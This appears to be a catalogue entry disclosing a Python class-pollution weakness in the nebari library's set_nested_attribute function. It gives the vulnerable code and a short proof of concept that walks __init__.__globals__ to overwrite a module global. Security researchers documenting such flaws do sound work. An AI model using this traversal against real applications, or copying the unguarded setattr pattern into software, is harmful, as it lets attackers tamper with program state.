## nebari

### Meta

+ Library: nebari
+ Stars: 286
+ Version: 2024.12.1
+ CVE: N/A
+ Status: Pending
+ Payload: ```_nebari.config.set_nested_attribute(obj, ['__init__', '__globals__', '__name__'], 'polluted')```
+ Foundby: BlackPyrl
+ Report: Pending
+ Type: App
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/nebari-dev/nebari

### Vulnerable Code Snippet

```python
def set_nested_attribute(data: Any, attrs: List[str], value: Any):
    """Takes an arbitrary set of attributes and accesses the deep
    nested object config to set value
    """

    def _get_attr(d: Any, attr: str):
        if isinstance(d, list) and re.fullmatch(r"\d+", attr):
            return d[int(attr)]
        elif hasattr(d, "__getitem__"):
            return d[attr]
        else:
            return getattr(d, attr)

    def _set_attr(d: Any, attr: str, value: Any):
        if isinstance(d, list) and re.fullmatch(r"\d+", attr):
            d[int(attr)] = value
        elif hasattr(d, "__getitem__"):
            d[attr] = value
        else:
            setattr(d, attr, value)

    data_pos = data
    for attr in attrs[:-1]:
        data_pos = _get_attr(data_pos, attr)
    _set_attr(data_pos, attrs[-1], value)

```
### PoC

```python
from _nebari.config import set_nested_attribute
from dataclasses import dataclass

@dataclass
class State:
  input: str
  output: str
  textarea_key: int

obj = State('HELLO', 'WORLD', 0)

set_nested_attribute(obj, ['__init__', '__globals__', '__name__'], 'polluted')
print(__name__) # polluted
```